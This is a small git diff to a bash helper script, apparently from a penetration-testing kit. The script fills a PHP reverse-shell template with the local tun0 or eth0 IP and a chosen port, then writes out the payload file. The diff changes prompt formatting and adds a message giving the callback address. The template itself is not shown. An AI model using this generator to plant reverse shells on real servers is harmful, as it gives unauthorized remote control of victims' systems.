@@ -17,13 +17,15 @@ if tun0_full=$(ifconfig tun0 2>/dev/null); then
     ip=$(/sbin/ifconfig eth0 | grep inet | cut -d" " -f10 | head -1);
 fi
 
-printf "\n${YELLOW}port?${NO_COLOR}"
+printf "${YELLOW}port?${NO_COLOR}"
 read port
 
-printf "\n${YELLOW}filename?${NO_COLOR}"
+printf "${YELLOW}filename?${NO_COLOR}"
 read filename
 
 current_dir=$(pwd)
 
 # magic
 /bin/sed -e "s@127.0.0.1@$ip@" -e "s@1234@$port@" $php_shell_reverse > $current_dir/$filename
+
+printf "${YELLOW}PHP reverse shell with cb to ${GREEN}$ip:$port ${NO_COLOR}${YELLOW} here: ${NO_COLOR}${GREEN} $current_dir/$filename \n${NO_COLOR}"
